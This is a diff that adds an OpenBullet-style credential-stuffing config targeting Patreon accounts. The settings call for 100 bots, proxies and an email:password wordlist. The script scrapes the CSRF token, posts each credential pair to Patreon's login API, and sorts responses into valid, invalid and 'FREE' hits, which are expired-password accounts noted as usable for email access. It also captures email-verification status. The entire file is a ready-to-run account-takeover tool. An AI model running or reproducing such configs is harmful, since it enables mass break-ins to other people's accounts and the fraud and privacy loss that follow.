@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Patreon",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T10:17:07.3683233+00:00",
+  "AdditionalInfo": "FREE accounts are existing accs but need password reset, so only valid for email access",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://www.patreon.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "window.patreon.csrfSignature = \"" "\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://www.patreon.com/api/login?include=campaign%2Cbucket_experiments&fields[bucket_experiments]=name%2Cvariant_for_current_request%2Celigibility_of_current_request&json-api-version=1.0" AutoRedirect=TRUE 
+  CONTENT "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"relationships\":{}}}" 
+  CONTENTTYPE "application/vnd.api+json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-csrf-signature: <CSRF>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password" 
+  KEYCHAIN Success OR 
+    KEY "last_name" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Your password has expired" 
+#CAPTURE_VERIFIED PARSE "<SOURCE>" LR "is_email_verified\":" "," Recursive=FALSE -> CAP "Verified" "" "" 
